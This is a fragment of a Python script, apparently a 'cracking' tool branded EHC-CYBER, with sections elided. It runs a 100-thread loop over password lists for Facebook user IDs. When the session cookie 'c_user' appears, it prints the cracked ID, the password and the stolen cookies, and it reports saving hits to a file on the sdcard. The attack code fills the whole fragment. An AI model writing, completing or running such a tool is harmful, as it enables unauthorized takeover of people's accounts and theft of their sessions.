...
logo="""
\033[38;5;46m8888888888 888    888  .d8888b.  
\033[38;5;46m888        888    888 d88P  Y88b 
\033[38;5;46m888        888    888 888    888 
\033[38;5;46m8888888    8888888888 888        
\033[38;5;46m888        888    888 888        
\033[38;5;46m888        888    888 888    888 
\033[38;5;46m888        888    888 Y88b  d88P 
\033[38;5;46m8888888888 888    888  "Y8888P" """
def line():
    print("—"*36)
def sykology():
    emran=[]
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(emran))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mEHC-ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[EHC-CYBER] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[EHC-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
